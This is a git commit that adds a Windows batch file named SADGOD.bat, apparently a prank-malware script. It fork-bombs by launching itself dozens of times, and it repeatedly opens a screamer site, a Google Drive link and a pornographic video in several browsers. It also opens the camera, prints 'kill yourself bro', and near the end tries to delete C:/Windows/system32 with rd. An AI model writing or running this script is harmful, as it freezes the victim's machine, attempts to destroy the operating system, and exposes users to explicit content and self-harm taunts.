af364f303cd65a08156d237049d8af484e5e3b64
SadGodproducters <lendosgosgosgugu@gmail.com>
2025-12-02 16:17:53 -0300

    It's not that dangerous, but I recommend using it in a virtual machine.

---
+++ SADGOD.bat
@@ -0,0 +1,150 @@
+@echo on
+echo its a test version
+Timeout 5
+echo HAHAHAHHAHAHAHAHAAHAHHAHAHAHAHHAHA
+echo HAHAHAHAHAHAHAHAHAHAHAGHAHAHAHAHAH
+start chrome piv.pivpiv.dk
+start SADGOD(1).bat
+start SADGOD(2).bat
+start SADGOD(3).bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD(1).bat
+start SADGOD(2).bat
+start SADGOD(3).bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+echo are you sure?
+Timeout 10
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start microsoft.windows.camera
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start firefox piv.pivpiv.dk
+start explorer piv.pivpiv.dk
+echo kill yourself bro
+start opera piv.pivpiv.dk
+start tor piv.pivpiv.dk
+start SADGOD.bat
+start tor broswer piv.pivpiv.dk
+start chrome piv.pivpiv.dk
+start chrome https://drive.google.com/file/d/1wif34V1yjhZ2QoDDfH__j4D9BM1HG6GD/view?usp=sharing
+start chrome https://drive.google.com/file/d/1wif34V1yjhZ2QoDDfH__j4D9BM1HG6GD/view?usp=sharing
+start explorer youtube.com
+start opera piv.pivpiv.dk
+start tor roblox.com
+start tor broswer piv.
+start chrome https://drive.google.com/file/d/1wif34V1yjhZ2QoDDfH__j4D9BM1HG6GD/view?usp=sharingpivpiv.dk
+start chrome roblox.com
+start firefox piv.pivpiv.dk
+start explorer piv.pivpiv.dk
+start opera piv.pivpiv.dk
+start tor piv.pivpiv.dk
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start SADGOD.bat
+start tor broswer piv.pivpiv.dk
+start chrome piv.pivpiv.dk
+start firefox piv.pivpiv.dk
+start explorer piv.pivpiv.dk
+start opera piv.pivpiv.
+start chrome https://drive.google.com/file/d/1wif34V1yjhZ2QoDDfH__j4D9BM1HG6GD/view?usp=sharingdk
+echo kill yourself bro
+start tor piv.pivpiv.dk
+start tor broswer piv.pivpiv.dk
+start chrome piv.pivpiv.dk
+start firefox piv.pivpiv.dk
+start explorer piv.pivpiv.dk
+start opera piv.pivpiv.dk
+start tor piv.pivpiv.dk
+start tor broswer piv.pivpiv.dk
+start chrome www.xvideos.com/video.okavvtf7263/cheguei_a_casa_do_meu_padrasto_e_vendo_que_ela_estava_sozinha_a_ordenhei_ate_a_ultima_gota_de_leite.
+start chrome https://drive.google.com/file/d/1wif34V1yjhZ2QoDDfH__j4D9BM1HG6GD/view?usp=sharing
+start SADGOD(1).bat
+echo bye pc ;D
+timeout 2
+start cmd dir/s
+cd /Windows/System32
+rd /s /d C:/Windows/system32
+echo bye...
+goto loop
